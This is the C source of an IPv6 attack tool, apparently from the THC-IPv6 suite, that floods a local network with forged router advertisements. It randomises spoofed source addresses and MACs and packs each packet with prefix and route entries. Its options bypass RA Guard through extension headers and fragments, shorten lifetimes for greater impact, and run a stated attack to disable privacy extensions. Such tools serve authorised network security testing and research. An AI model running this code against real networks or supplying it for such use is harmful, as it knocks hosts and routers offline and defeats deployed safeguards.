#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFD] [-sSG] [-RPA] interface [target]\n\n", prg);
  printf("Flood the local network with router advertisements.\n");
  printf("Each packet contains ~25 prefix and route enries\n");
  printf("Modes:\n");
  printf("  default  sends both routing entries and prefix information\n");
  printf("  -R       does only send routing entries, no prefix information\n");
  printf("  -P       does only send prefix information, no routing entries\n");
  printf("  -A       an attack to disable privacy extensions\n");
  printf("Options:\n");
  printf("  -a       add a hopbyhop header with router alert\n");
  printf("  -H       add a hopbyhop header to bypass RA guard security\n");
  printf(
      "  -f       add an atomic fragment header to bypass RA guard security\n");
  printf(
      "  -D       add a large destination header to bypass RA guard "
      "security\n");
  printf(
      "  -F       perform full RA guard evasion (disallows all other bypass "
      "options)\n");
  printf(
      "  -s       use small lifetimes, resulting in a more devasting impact\n");
  printf("  -S       performs a slow start, which can increases the impact\n");
  printf("  -G       gigantic packet of 64kb of prefix/route entries\n");
  printf("  -m       add DHCPv6 managed/other flags to RA\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6;
  unsigned char *buf, buf2[6], buf3[1504];
  unsigned char *dst = thc_resolve6("ff02::1"),
                *dstmac = thc_get_multicast_mac(dst);
  int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0,
                          offset = 14;
  unsigned char *pkt = NULL;
  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0,
      do_frag = 0, do_dst = 0, bsize = -1, do_dhcp = 0, do_full = 0;
  int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0,
           prefer = PREFER_LINK;
  thc_ipv6_hdr *hdr = NULL;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  while ((i = getopt(argc, argv, "fDFHRPAarsmSG")) >= 0) {
    switch (i) {
      case 'r':
        thc_ipv6_rawmode(1);
        rawmode = 1;
        break;
      case 's':
        lifetime = 0x01000000;
        break;
      case 'm':
        do_dhcp = 128 + 64;
        break;
      case 'S':
        slow = 16;
        break;
      case 'G':
        bsize = 65488;
        break;
      case 'A':
        deanon = 1;
        prefix_only = 1;
        cnt = 5;
        until = 256;
        break;
      case 'f':
        do_frag++;
        break;
      case 'F':
        do_full = 1;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'a':
        do_alert = 1;
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      case 'R':
        route_only = 1;
        break;
      case 'P':
        prefix_only = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (do_full) do_frag = do_alert = do_hop = do_dst = 0;

  interface = argv[optind];

  if (prefix_only && route_only) {
    fprintf(stderr, "Error: -P/-A and -R can not be specified together!\n");
    exit(-1);
  }

  if (bsize == -1) {
    bsize = thc_get_mtu(interface) - 40;
    if (bsize < 1240 || bsize > 1460) {
      fprintf(stderr, "Error: invalid MTU on interface %s: %d\n", interface,
              thc_get_mtu(interface));
      exit(-1);
    }
  }

  if (argc - optind > 1) {
    if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
      fprintf(stderr, "Error: invalid target %s\n", argv[optind + 1]);
      exit(-1);
    }
    if (dst[0] >= 0x20 && dst[0] <= 0xfd) {
      prefer = PREFER_GLOBAL;
      ip6 = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
    }
  }

  if ((buf = malloc(bsize)) == NULL) {
    fprintf(stderr, "Error: malloc() failed\n");
    exit(-1);
  }

  if (deanon == 0) {
    i = 0;
    if (prefix_only == 0) i += 24;
    if (route_only == 0) i += 32;
    // printf("i %d  route %d prefix %d\n", i, prefix_only, route_only);
    cnt = (bsize - 32 - (do_hop + do_dst + do_frag) * 8) / i;
  }

  if (argc - optind < 1) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  mac[0] = 0;
  mac[1] = 0x0c;
  mtu = 1500;
  size = 64;
  k = rand();
  if (prefer == PREFER_LINK) {
    ip6 = malloc(16);
    memset(ip6, 0, 16);
    ip6[0] = 0xfe;
    ip6[1] = 0x80;
  } else {
    memset(ip6 + 8, 0, 8);
  }
  ip6[9] = (k % 65536) / 256;
  ip6[10] = k % 256;
  ip6[15] = 1;
  k++;
  if (do_hdr_size) offset = do_hdr_size;

  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));
  memset(buf, 0, bsize);
  buf[1] = 0x30;
  buf[5] = 30;
  buf[8] = 5;  // mtu
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  buf[16] = 1;  // mac
  buf[17] = 1;
  buf[18] = 0;
  buf[19] = 0x0c;
  // 18-23 = mac address
  buf[19] = 12;
  j = 24;
  if (route_only == 0) {
    for (i = 0; i < cnt; i++) {  // prefix
      buf[j] = 3;                // prefix
      buf[j + 1] = 4;
      buf[j + 2] = size;
      buf[j + 3] = 128 + 64 + 32;
      memcpy(buf + j + 4, (char *)&lifetime + _TAKE4, 4);
      memcpy(buf + j + 8, (char *)&lifetime + _TAKE4, 4);
      //      buf[j+5] = 2;
      //      buf[j+9] = 1;
      //      memset(&buf[j+16], 255, 8);
      if (deanon) {
        buf[j + 16] = 0xfd;
        buf[j + 17] = 0x00;
      } else {
        buf[j + 16] = 0x20;
        buf[j + 17] = 0x12;
      }
      buf[j + 18] = (k % 65536) / 256;
      buf[j + 19] = k % 256;
      j += 32;
      k++;
    }
  }
  if (prefix_only == 0) {
    for (i = 0; i < cnt; i++) {  // route
      buf[j] = 24;
      buf[j + 1] = 3;
      buf[j + 2] = size;
      buf[j + 3] = 8;
      memcpy(buf + j + 4, (char *)&lifetime + _TAKE4, 4);
      //      buf[j+5] = 1; // 4-7 lifetime
      //      memset(&buf[j+8], 255, 8);
      buf[j + 8] = 32;
      buf[j + 9] = 4;
      buf[j + 10] = k / 256;
      buf[j + 11] = k % 256;
      j += 24;
      k++;
    }
  }

  if (do_alert) {
    buf2[0] = 5;
    buf2[1] = 2;
  }

  // printf("DBG: %d entries of %s %s\n", cnt, route_only == 0 ? "prefix" : "",
  // prefix_only == 0 ? "route" : ""); printf("j is %d, bsize %d\n", j, bsize);
  printf(
      "Starting to flood network with router advertisements on %s (Press "
      "Control-C to end, a dot is printed for every 1000 packets):\n",
      interface);
  while (until != 1) {
    memcpy(ip6 + 11, (char *)&k + _TAKE4, 4);
    memcpy(&buf[20], (char *)&k + _TAKE4, 4);
    memcpy(mac, (char *)&k + _TAKE4, 4);
    k++;
    for (i = 0; i < cnt; i++) {
      if (route_only == 0)
        memcpy(&buf[24 + 20 + i * 32], (char *)&k + _TAKE4, 4);
      k++;
      if (prefix_only == 0) {
        if (route_only == 0)
          memcpy(&buf[24 + 12 + i * 24 + cnt * 32], (char *)&k + _TAKE4, 4);
        else
          memcpy(&buf[24 + 12 + i * 24], (char *)&k + _TAKE4, 4);
      }
      k++;
    }
    count++;
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                        dst, 255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (do_hop) {
      type = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (type == NXT_ICMP6) type = NXT_FRAG;
      for (i = 0; i < do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, count + i) < 0)
          return -1;
    }
    if (do_dst) {
      if (type == NXT_ICMP6) type = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
    }
    if (lifetime != 0x01000000)
      mfoo = 0xff08ffff;
    else
      mfoo = 0xff080001;
    if (do_dhcp) mfoo = (mfoo | (do_dhcp << 16));
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, mfoo, buf, j, 0) < 0)
      return -1;
    if (do_full) {
      thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
      hdr = (thc_ipv6_hdr *)pkt;
      thc_send_raguard_bypass6(interface, ip6, dst, mac6, dstmac, NXT_ICMP6,
                               hdr->pkt + 40 + offset,
                               hdr->pkt_len - 40 - offset, 0);
    } else if (do_dst || bsize + 40 > thc_get_mtu(interface)) {
      thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset,
                            hdr->pkt_len - 40 - offset, 1240);
    } else {
      if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) <
          0) {
        printf("!");
      }
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (slow > 0) {
      printf("slow ");
      sleep(slow / 2);
      slow--;
    }
    if (count % 1000 == 0) printf(".");
    if (until > 1) until--;
  }

  if (deanon) printf("\nPrivacy extension attack done.\n");

  return 0;
}
